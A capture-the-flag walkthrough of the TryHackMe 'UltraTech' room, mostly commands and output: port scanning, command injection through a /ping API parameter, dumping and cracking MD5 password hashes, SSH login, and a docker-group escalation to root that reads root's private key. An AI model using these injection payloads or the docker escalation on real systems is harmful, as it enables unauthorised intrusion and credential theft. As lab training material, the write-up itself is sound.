# UltraTech

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Medium
Tags: Linux, Web
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing
```

Room link: [https://tryhackme.com/room/ultratech1](https://tryhackme.com/room/ultratech1)

## Solution

### Task 1: Deploy the machine

#### Set up your virtual environment

To successfully complete this room, you'll need to set up your virtual environment. This involves starting both your AttackBox (if you're not using your VPN) and Lab Machines, ensuring you're equipped with the necessary tools and access to tackle the challenges ahead.

#### - UltraTech -

This room is inspired from real-life vulnerabilities and misconfigurations I encountered during security assessments.

If you get stuck at some point, take some time to keep enumerating.

#### Your Mission

You have been contracted by UltraTech to pentest their infrastructure.

It is a grey-box kind of assessment, the only information you have is the company's name and their server's IP address.

Start this room by hitting the "deploy" button on the right!

Good luck and more importantly, have fun!

`Lp1 <fenrir.pro>`

#### Extra Information

If you have any comment or question regarding this room, you can contact me on **TryHackMe's Discord**.

---------------------------------------------------------------------------------------

### Task 2: It's enumeration time

After enumerating the services and resources available on this machine, what did you discover?

We start by scanning the machine on all ports with `nmap` including service info and default scripts.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ export TARGET_IP=10.113.143.115                            

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ sudo nmap -sC -sV -p- $TARGET_IP
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-24 11:02 +0200
Nmap scan report for 10.113.143.115
Host is up (0.025s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a9:a4:01:82:74:48:86:39:11:8c:55:25:47:57:fd:0e (RSA)
|   256 06:26:5c:71:4d:c0:7a:22:b7:70:62:cc:aa:36:5f:47 (ECDSA)
|_  256 e9:47:b7:7f:86:63:19:10:ab:63:92:32:b9:fc:17:3b (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.88 seconds
```

We have four TCP-services running and available:

- vsftpd 3.0.5 running on port 21
- OpenSSH 8.2p1 running on port 22
- Node.js Express framework running on port 8081
- Apache httpd 2.4.41 running on port 31331

#### Which software is using the port 8081?

See the nmap scan above.

Answer: `Node.js`

#### Which other non-standard port is used?

See the nmap scan above.

Answer: `31331`

#### Which software using this port?

See the nmap scan above.

Answer: `Apache`

#### Which GNU/Linux distribution seems to be used?

See the nmap scan above.

Answer: `Ubuntu`

Next, we continue our web enumeration, checking for standard files.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ curl http://$TARGET_IP:8081/robots.txt                          
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /robots.txt</pre>
</body>
</html>

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ curl http://$TARGET_IP:31331/robots.txt
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt


┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ curl http://$TARGET_IP:8081/sitemap.xml
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /sitemap.xml</pre>
</body>
</html>

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ curl http://$TARGET_IP:31331/sitemap.xml
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.113.143.115 Port 31331</address>
</body></html>

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ curl http://$TARGET_IP:31331/utech_sitemap.txt
/
/index.html
/what.html
/partners.html
```

We have two more non-standard files to check.

On `http://10.113.143.115:31331/partners.html` we find a `Private Partners Area`:

![UltraTech Partner Portal](Images/UltraTech_Partner_Portal.png)

Checking the HTML-source of this page, we find refrences to two JavaScript files.

```html
<---snip--->
    </div>
    <script src='js/app.min.js'></script>
    <script src='js/api.js'></script>
</body>
</html>
```

Let's analyse them further.

#### The software using the port 8081 is a REST api, how many of its routes are used by the web application?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ curl http://$TARGET_IP:31331/js/api.js        
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
        return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
        const req = new XMLHttpRequest();
        try {
            const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
            req.open('GET', url, true);
            req.onload = function (e) {
                if (req.readyState === 4) {
                    if (req.status === 200) {
                        console.log('The api seems to be running')
                    } else {
                        console.error(req.statusText);
                    }
                }
            };
            req.onerror = function (e) {
                console.error(xhr.statusText);
            };
            req.send(null);
        }
        catch (e) {
            console.error(e)
            console.log('API Error');
        }
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ curl http://$TARGET_IP:8081/ping?ip=127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms
```

Some kind of Ping function/API. Maybe we can use it for OS command injection later on?

We see two APIs in the file: `/ping` and `/auth`.

Answer: `2`

On to the next file.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ source ~/Python_venvs/Binary_Refinery/bin/activate

┌──(Binary_Refinery)─(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ curl -s http://$TARGET_IP:31331/js/app.min.js | ppjscript
document.addEventListener("DOMContentLoaded", function() {
        window.pageYOffset || document.documentElement.scrollTop;

        function e(e, t) {
            if (e) {
                "string" == typeof e ? e = document.querySelectorAll(e) : e.tagName && (e = [e]);
                for (var n = 0; n < e.length; n++)(" " + e[n].className + " ").indexOf(" " + t + " ") < 0 && (e[n].className += " " + t)
            }
        }

        function t(e, t) {
            if (e) {
                "string" == typeof e ? e = document.querySelectorAll(e) : e.tagName && (e = [e]);
                for (var n = new RegExp("(^| )" + t + "($| )", "g"), o = 0; o < e.length; o++) e[o].className = e[o].className.replace(n, " ")
            }
        }
<---snip--->
```

A lot of code, but nothing that stands out.

---------------------------------------------------------------------------------------

### Task 3: Let the fun begin

Now that you know which services are available, it's time to exploit them!

Did you find somewhere you could try to login? Great!

Quick and dirty login implementations usually goes with poor data management.

There must be something you can do to explore this machine more thoroughly...

---------------------------------------------------------------------------------------

Let's verify if we can get [OS command injection](https://en.wikipedia.org/wiki/Code_injection#Shell_injection).

And we can, with an URL-endoded version of

```bash
`<cmd>`
```

with some output limitations.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ curl "http://$TARGET_IP:8081/ping?ip=127.0.0.1;%60whoami%60"
ping: 127.0.0.1www: Name or service not known

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ curl "http://$TARGET_IP:8081/ping?ip=127.0.0.1;%60id%60"
ping: groups=1002(www): Name or service not known
```

#### There is a database lying around, what is its filename?

Hint: Look closely how the API is used. Don't spend too much time on /auth, it isn't the only route available.

Checking for files with `ls` we find a SQLite database file.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ curl "http://$TARGET_IP:8081/ping?ip=127.0.0.1;%60ls%60"    
ping: utech.db.sqlite: Name or service not known
```

Answer: `utech.db.sqlite`

#### What is the first user's password hash?

Running `cat` on the file, we get usernames and hashes.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ curl "http://$TARGET_IP:8081/ping?ip=127.0.0.1;%60cat%20utech.db.sqlite%60"
���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84: Name or service not known
```

- Username: `r00t`
- Hash: `f357a0c52799563c7c7b76c1e7543a32`

and

- Username: `admin`
- Hash: `0d0ea5111e3c1def594c1684e3b9be84`

Answer: `f357a0c52799563c7c7b76c1e7543a32`

#### What is the password associated with this hash?

Hint: We will, we will *******.txt

The length and format of the hashes looks like they could be MD5-hashses.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ hashcat -m 0 f357a0c52799563c7c7b76c1e7543a32 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz, 2913/5890 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f357a0c52799563c7c7b76c1e7543a32:n100906                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: f357a0c52799563c7c7b76c1e7543a32
Time.Started.....: Mon Aug 24 12:05:02 2026 (2 secs)
Time.Estimated...: Mon Aug 24 12:05:04 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2668.3 kH/s (0.22ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5246976/14344385 (36.58%)
Rejected.........: 0/5246976 (0.00%)
Restore.Point....: 5242880/14344385 (36.55%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: n1ckos -> mztthew
Hardware.Mon.#1..: Util: 26%

Started: Mon Aug 24 12:05:01 2026
Stopped: Mon Aug 24 12:05:05 2026

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ hashcat -m 0 0d0ea5111e3c1def594c1684e3b9be84 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz, 2913/5890 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

0d0ea5111e3c1def594c1684e3b9be84:mrsheafy                 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 0d0ea5111e3c1def594c1684e3b9be84
Time.Started.....: Mon Aug 24 11:56:03 2026 (4 secs)
Time.Estimated...: Mon Aug 24 11:56:07 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1914.0 kH/s (0.21ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5345280/14344385 (37.26%)
Rejected.........: 0/5345280 (0.00%)
Restore.Point....: 5341184/14344385 (37.24%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: mryal -> mrsburgy
Hardware.Mon.#1..: Util: 16%

Started: Mon Aug 24 11:56:00 2026
Stopped: Mon Aug 24 11:56:09 2026
```

So we have:

- Username: `r00t`
- Hash: `f357a0c52799563c7c7b76c1e7543a32`
- Password: `n100906`

and

- Username: `admin`
- Hash: `0d0ea5111e3c1def594c1684e3b9be84`
- Password: `mrsheafy`.

Answer: `n100906`

---------------------------------------------------------------------------------------

### Task 4: The root of all evil

Congrats if you've made it this far, you should be able to comfortably run commands on the server by now!

Now's the time for the final step!

You'll be on your own for this one, there is only one question and there might be more than a single way to reach your goal.

Mistakes were made, take advantage of it.

We first check if we can gain SSH-access with the credentials above.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/UltraTech]
└─$ ssh r00t@$TARGET_IP                                                    
The authenticity of host '10.113.143.115 (10.113.143.115)' can't be established.
ED25519 key fingerprint is SHA256:yYhqT+3broi0hcyMgDXJH51eiMDlTE8f9K2qrVnoIxg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.113.143.115' (ED25519) to the list of known hosts.
r00t@10.113.143.115's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 24 Aug 2026 10:09:02 AM UTC

  System load:  0.01               Processes:             123
  Usage of /:   38.4% of 19.51GB   Users logged in:       0
  Memory usage: 40%                IPv4 address for ens5: 10.113.143.115
  Swap usage:   0%

 * Ubuntu 20.04 LTS Focal Fossa has reached its end of standard support on 31 Ma
 
   For more details see:
   https://ubuntu.com/20-04

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

80 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00t@ip-10-113-143-115:~$ 
```

Success! We are in!

Let's start with some basic enumeration.

```bash
r00t@ip-10-113-143-115:~$ ls -la
total 24
drwxr-xr-x 3 r00t r00t 4096 Aug 24 10:09 .
drwxr-xr-x 6 root root 4096 Oct 26  2025 ..
-rw-r--r-- 1 r00t r00t  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 r00t r00t 3771 Apr  4  2018 .bashrc
drwx------ 2 r00t r00t 4096 Aug 24 10:09 .cache
-rw-r--r-- 1 r00t r00t  807 Apr  4  2018 .profile
r00t@ip-10-113-143-115:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
r00t@ip-10-113-143-115:~$ ls -l /home
total 16
drwxr-xr-x 5 lp1    lp1    4096 Mar 22  2019 lp1
drwxr-xr-x 3 r00t   r00t   4096 Aug 24 10:09 r00t
drwxr-xr-x 4 ubuntu ubuntu 4096 Oct 26  2025 ubuntu
drwxr-xr-x 5 www    www    4096 Mar 22  2019 www
r00t@ip-10-113-143-115:~$ 
```

Ah, we are in the [docker](https://gtfobins.org/gtfobins/docker/) group.

We ought to be able to get a root shell.

```bash
r00t@ip-10-113-143-115:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# 
```

And we are!

#### What are the first 9 characters of the root user's private SSH key?

Finally, we get root's private SSH key.

```bash
# ls /root/.ssh
authorized_keys  id_rsa  id_rsa.pub
# cat /root/.ssh/id_rsa | head -n2
-----BEGIN RSA PRIVATE KEY-----
M<REDACTED>AAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
```

Answer: `M<REDACTED>A`

---------------------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [API - Wikipedia](https://en.wikipedia.org/wiki/API)
- [Binary Refinery - Documentation](https://binref.github.io/)
- [Binary Refinery - GitHub](https://github.com/binref/refinery/)
- [cat - Linux manual page](https://man7.org/linux/man-pages/man1/cat.1.html)
- [Code injection - Wikipedia](https://en.wikipedia.org/wiki/Code_injection)
- [curl - Homepage](https://curl.se/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cURL - Wikipedia](https://en.wikipedia.org/wiki/CURL)
- [docker - GTFOBins](https://gtfobins.org/gtfobins/docker/)
- [Docker (software) - Wikipedia](https://en.wikipedia.org/wiki/Docker_(software))
- [export - Linux manual page](https://www.man7.org/linux/man-pages/man1/export.1p.html)
- [File Transfer Protocol - Wikipedia](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
- [Hashcat - Homepage](https://hashcat.net/hashcat/)
- [Hashcat - Kali Tools](https://www.kali.org/tools/hashcat/)
- [Hashcat - Wiki](https://hashcat.net/wiki/)
- [head - Linux manual page](https://man7.org/linux/man-pages/man1/head.1.html)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [JavaScript - Wikipedia](https://en.wikipedia.org/wiki/JavaScript)
- [MD5 - Wikipedia](https://en.wikipedia.org/wiki/MD5)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Node.js - Wikipedia](https://en.wikipedia.org/wiki/Node.js)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [robots.txt - Wikipedia](https://en.wikipedia.org/wiki/Robots.txt)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [Sitemaps - Wikipedia](https://en.wikipedia.org/wiki/Sitemaps)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [vsftpd - Wikipedia](https://en.wikipedia.org/wiki/Vsftpd)
